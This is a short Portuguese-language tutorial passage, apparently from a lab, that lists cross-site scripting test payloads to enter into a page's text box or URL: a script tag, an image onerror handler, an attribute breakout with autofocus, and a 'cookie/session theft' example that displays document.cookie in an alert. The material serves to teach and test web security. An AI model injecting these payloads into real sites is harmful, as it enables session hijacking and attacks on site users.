Executando os Ataques de Teste

Abra o navegador e teste os seguintes payloads na caixa de texto ou diretamente na URL:

1. **Teste 1 (Tag Script):**
   ```text
   <script>alert('XSS Executado!')</script>
   ```
   *Resultado:* O alerta pop-up é disparado imediatamente.

2. **Teste 2 (Evento OnError em Imagem):**
   ```text
   <img src="nao_existe.jpg" onerror="alert('XSS via Imagem!')">
   ```
   *Resultado:* A imagem quebra e o JavaScript executa instantaneamente.

3. **Teste 3 (Quebra de Atributo Input):**
   ```text
   " onfocus="alert('XSS no Input!')" autofocus="
   ```
   *Resultado:* O input ganha foco automático ao carregar a página e dispara o script.

4. **Roubo de Cookie/Sessão**

    <script>alert('Cookie capturado: ' + document.cookie);</script>